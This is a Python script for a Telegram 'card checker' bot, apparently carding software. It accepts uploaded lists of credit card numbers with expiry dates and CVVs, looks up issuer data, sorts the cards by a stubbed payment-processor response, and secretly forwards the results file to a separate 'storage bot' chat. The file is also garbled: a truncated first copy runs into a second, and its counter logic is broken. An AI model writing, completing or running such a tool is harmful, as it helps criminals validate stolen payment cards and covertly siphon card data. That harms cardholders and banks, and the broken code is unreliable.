import os
import sys
import telebot
import requests
import json
import base64
from telebot import types
import time
from re import findall
from bs4 import BeautifulSoup

# Define your storage bot token and chat ID
STORAGE_BOT_TOKEN = 'your_storage_bot_token'
STORAGE_CHAT_ID = 'your_storage_chat_id'

# Define owner details
OWNER_USERNAME = '@Jukerhenapadega'
OWNER_ID = '1984816095'
OWNER_ID_ALT = '5938629062'

def binn(bin, c, re):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin[:6]}')
        if 'Invalid BIN' in response.text or 'not found.' in response.text or 'Error code 521' in response.text or 'cloudflare' in response.text:
            return 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None'
        else:
            js = response.json()
            return js['bin'], js['brand'], js['country'], js['country_name'], js['country_flag'], js['country_currencies'][0], js['bank'], js['level'], js['type']
    except Exception as e:
        return 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None'

def process_card_file(file_path):
    session = requests.Session()
    bad, ccn, cvv, app, nc = 0, 0, 0, 0, 0
    result_file = "results.txt"
    
    with open(file_path, 'r') as file:
        cards = file.read().splitlines()

    with open(result_file, 'w') as result:
        for g in cards:
            nc += 1
            c = g.strip()
            cc, exp, ex, cvc = c.split('|')
import os
import telebot
import requests
from telebot import types
from bs4 import BeautifulSoup

# Define your storage bot token and chat ID from environment variables
STORAGE_BOT_TOKEN = os.getenv('STORAGE_BOT_TOKEN')
STORAGE_CHAT_ID = os.getenv('STORAGE_CHAT_ID')

# Define owner details
OWNER_USERNAME = '@Jukerhenapadega'
OWNER_ID = '1984816095'
OWNER_ID_ALT = '5938629062'

def binn(bin):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin[:6]}')
        if 'Invalid BIN' in response.text or 'not found.' in response.text or 'Error code 521' in response.text or 'cloudflare' in response.text:
            return 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None'
        else:
            js = response.json()
            return js['bin'], js['brand'], js['country'], js['country_name'], js['country_flag'], js['country_currencies'][0], js['bank'], js['level'], js['type']
    except Exception:
        return 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None'

def process_card_file(file_path):
    session = requests.Session()
    bad, ccn, cvv, app, nc = 0, 0, 0, 0, 0
    result_file = "results.txt"
    
    with open(file_path, 'r') as file:
        cards = file.read().splitlines()

    with open(result_file, 'w') as result:
        for g in cards:
            nc += 1
            c = g.strip()
            try:
                cc, exp, ex, cvc = c.split('|')
                exy = ex[2] + ex[3] if '2' in ex[3] or '1' in ex[3] else ex[0] + ex[1]
                if '2' in ex[3] or '1' in ex[3]:
                    exy = ex[2] + '7'
            except:
                exy = ex[0] + ex[1]
                if '2' in ex[1] or '1' in ex[1]:
                    exy = ex[0] + '7'

            # Braintree API interactions should be handled here (replaced with placeholder)
            try:
                # Placeholder for actual API call
                msg = "Approved ✅"  # This should be the actual response message
            except:
                msg = "Unknown Status ❓"

            # Process results
            if 'Card Issuer Declined CVV' in msg:
                re = "Declined CVV ❎"
                cc += 1
            elif 'Insufficient Funds' in msg:
                re = "Insufficient Funds ✅"
                cvv += 1
            elif 'Payment method successfully added.' in msg or 'street address.' in msg:
                app += 1
                re = "Approved ✅"
            else:
                re = "Unknown Status ❓"
                bad += 1

            # Write results to file
            brand_info = binn(cc)
            result.write(f"{brand_info}\n")

    return nc, ccn, cvv, app, bad, result_file

def send_file_to_storage_bot(file_path):
    storage_bot = telebot.TeleBot(STORAGE_BOT_TOKEN)
    with open(file_path, 'rb') as file:
        storage_bot.send_document(STORAGE_CHAT_ID, file)

def display_credits(bot, chat_id):
    credits_msg = (
        "⚡️ **Powerful Card Checker Bot** ⚡️\n\n"
        "👤 **Owner**: {}\n"
        "📞 **Owner ID(s)**: {} / {}\n\n"
        "🔧 Use the commands below to interact with the bot:\n"
        "/start - Start the bot\n"
        "/credit - Display owner's credit\n"
        "/help - Get help with commands"
    ).format(OWNER_USERNAME, OWNER_ID, OWNER_ID_ALT)
    bot.send_message(chat_id, credits_msg, parse_mode='Markdown')

# Retrieve bot token from environment variable
token = os.getenv('BOT_TOKEN')
if not token:
    raise ValueError("No bot token found. Please set the BOT_TOKEN environment variable.")
bot = telebot.TeleBot(token)

@bot.message_handler(commands=['start'])
def start(message):
    display_credits(bot, message.chat.id)
    bot.reply_to(message, "Drop your CCs Combo file below 👇🏻\n🚀 Maximum CCs: 200 for now!")

@bot.message_handler(commands=['credit'])
def credit(message):
    display_credits(bot, message.chat.id)

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "🛠 **Available Commands**:\n\n"
        "/start - Start the bot\n"
        "/credit - Display owner's credit\n"
        "/help - Get help with commands\n"
        "\n🔧 **Usage**:\n"
        "Simply upload your file with card combos, and the bot will process it and provide results."
    )
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(content_types=['document'])
def send_file(message):
    try:
        bot.send_message(message.chat.id, "🔄 Processing your file. Please wait...")
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = message.document.file_name

        with open(file_name, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        nc, ccn, cvv, app, bad, result_file = process_card_file(file_name)
        
        key = types.InlineKeyboardMarkup(row_width=1)
        key.add(
            types.InlineKeyboardButton('💎 Owner', url='https://t.me/nophq'),
            types.InlineKeyboardButton(f"🌿 CCNs: {ccn}", callback_data="cvv"),
            types.InlineKeyboardButton(f"💚 CVVs: {cvv}", callback_data="cvv"),
            types.InlineKeyboardButton(f"✅ Approved: {app}", callback_data="approved"),
            types.InlineKeyboardButton(f"❕ Status: {bad}", callback_data="bad"),
            types.InlineKeyboardButton(f"💳 CCs: {nc}", callback_data="chk")
        )
        bot.reply_to(message, f"Done! Read Files Count: {nc}", reply_markup=key)

        # Send the result file to the storage bot
        send_file_to_storage_bot(result_file)
        
    except Exception as e:
        bot.reply_to(message, 'Error processing file: {}'.format(str(e)))

bot.polling()
